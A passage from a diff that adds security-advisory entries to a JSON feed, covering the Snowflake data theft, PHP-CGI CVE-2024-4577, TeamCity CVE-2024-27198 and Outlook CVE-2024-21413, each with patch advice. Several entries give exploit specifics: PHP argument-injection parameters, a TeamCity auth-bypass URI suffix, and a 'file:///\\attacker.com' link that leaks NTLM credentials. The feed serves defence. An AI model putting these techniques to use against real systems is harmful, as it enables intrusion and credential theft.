+    "technicalDetails": "Threat actors utilized historical credentials on Snowflake instances that had not configured SSO/MFA, systematically running SQL 'COPY INTO' statements to export terabytes of customer databases into attacker-controlled S3 staging buckets.",
+    "affectedProducts": [
+      "Snowflake Customer Deployments without enforced MFA",
+      "Corporate accounts lacking IP Allowlisting"
+    ],
+    "recommendations": "Mandate MFA across all administrative and service accounts immediately. Configure Network Policies in Snowflake to restrict access exclusively to trusted corporate CIDR blocks and VPN egress IPs.",
+    "patchUrl": ""
+  },
+  {
+    "id": "cve-2024-4577-php-cgi-rce",
+    "title": "PHP-CGI Argument Injection Vulnerability Exploited in the Wild",
+    "summary": "CVE-2024-4577 allows remote attackers to bypass previous protections (CVE-2012-1823) on Windows systems utilizing PHP in CGI mode, leading to unauthorized remote code execution through character encoding quirks (Best-Fit mapping).",
+    "category": "CVE / Vulnerabilities",
+    "source": "DEVCORE & CISA KEV",
+    "sourceUrl": "https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/",
+    "publishedAt": "2024-06-06T10:00:00Z",
+    "tags": [
+      "CVE-2024-4577",
+      "PHP",
+      "RCE",
+      "Windows",
+      "Argument Injection",
+      "CISA-KEV"
+    ],
+    "cveId": "CVE-2024-4577",
+    "severity": "Critical",
+    "cvssScore": 9.8,
+    "image": "",
+    "author": "Orange Tsai (DEVCORE)",
+    "whyItMatters": "Mass active exploitation commenced within 24 hours of public disclosure. Default XAMPP installations on Windows running Traditional Chinese, Simplified Chinese, or Japanese locales are exposed by default.",
+    "technicalDetails": "Windows Best-Fit encoding translates soft hyphen characters (%ad) into standard ASCII hyphens (-), allowing attackers to pass arbitrary command-line arguments to the php.exe binary (such as -d allow_url_include=1 and auto_prepend_file=php://input).",
+    "affectedProducts": [
+      "PHP 8.3 < 8.3.8",
+      "PHP 8.2 < 8.2.20",
+      "PHP 8.1 < 8.1.29",
+      "All default XAMPP Windows packages"
+    ],
+    "recommendations": "Upgrade PHP to versions 8.3.8, 8.2.20, or 8.1.29. For legacy systems, migrate from mod_cgi to FastCGI (php-fpm), or configure Apache rewrite rules to block queries containing %ad characters.",
+    "patchUrl": "https://www.php.net/downloads"
+  },
+  {
+    "id": "cve-2024-27198-jetbrains-teamcity-auth-bypass",
+    "title": "Authentication Bypass in JetBrains TeamCity Server (CVE-2024-27198)",
+    "summary": "Critical vulnerability in JetBrains TeamCity continuous integration server allows unauthenticated remote attackers to bypass authentication and create new administrator accounts or take over the CI/CD pipeline.",
+    "category": "CVE / Vulnerabilities",
+    "source": "Rapid7 & JetBrains",
+    "sourceUrl": "https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-vulnerabilities/",
+    "publishedAt": "2024-03-04T12:00:00Z",
+    "tags": [
+      "CVE-2024-27198",
+      "JetBrains",
+      "TeamCity",
+      "Auth Bypass",
+      "CI/CD",
+      "Critical"
+    ],
+    "cveId": "CVE-2024-27198",
+    "severity": "Critical",
+    "cvssScore": 9.8,
+    "image": "",
+    "author": "Rapid7 Research",
+    "whyItMatters": "Compromise of a build server affords direct access to source code repositories, production deployment secrets, and supply chain code injection points.",
+    "technicalDetails": "Alternative paths handled by the Spring web controller allowed parameter manipulation using URI query suffixes (?jsp=/app/rest/users) to bypass authentication filters and execute administrative user creation REST endpoints.",
+    "affectedProducts": [
+      "JetBrains TeamCity On-Premises < 2023.11.4"
+    ],
+    "recommendations": "Upgrade immediately to TeamCity 2023.11.4 or apply the JetBrains security patch plugin. Isolate TeamCity web interfaces behind corporate VPNs.",
+    "patchUrl": "https://blog.jetbrains.com/teamcity/2024/03/additional-critical-security-issues-affecting-teamcity-on-premises-cve-2024-27198-and-cve-2024-27199/"
+  },
+  {
+    "id": "cve-2024-21413-microsoft-outlook-monikers",
+    "title": "Critical Microsoft Outlook Moniker Link RCE Vulnerability (CVE-2024-21413)",
+    "summary": "Dubbed '#MonikerLink', this flaw bypasses Protected View security barriers and leaks NTLM credentials or triggers remote code execution when an Outlook recipient simply clicks an arbitrary file link.",
+    "category": "CVE / Vulnerabilities",
+    "source": "Check Point Research & MSRC",
+    "sourceUrl": "https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-cve-2024-21413/",
+    "publishedAt": "2024-02-13T18:00:00Z",
+    "tags": [
+      "CVE-2024-21413",
+      "Outlook",
+      "RCE",
+      "NTLM",
+      "Critical",
+      "MonikerLink"
+    ],
+    "cveId": "CVE-2024-21413",
+    "severity": "Critical",
+    "cvssScore": 9.8,
+    "image": "",
+    "author": "Check Point Research",
+    "whyItMatters": "Allows unauthenticated attackers to execute arbitrary code or capture hashed network credentials without Outlook displaying standard security warning dialogues.",
+    "technicalDetails": "By crafting links using the 'file://' scheme accompanied by an exclamation mark delimiter ('file:///\\\\attacker.com\\test!something'), Outlook delegates processing to the Component Object Model (COM) moniker engine, bypassing standard security validation checks.",
+    "affectedProducts": [
+      "Microsoft Outlook 2016 / 2019",
+      "Microsoft Office LTSC 2021",
+      "Microsoft 365 Apps for Enterprise"
+    ],
+    "recommendations": "Apply the official Microsoft February 2024 security updates. Block outbound SMB traffic (TCP port 445) at the perimeter firewall to prevent remote NTLM credential harvesting.",
+    "patchUrl": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413"
+  }
+]
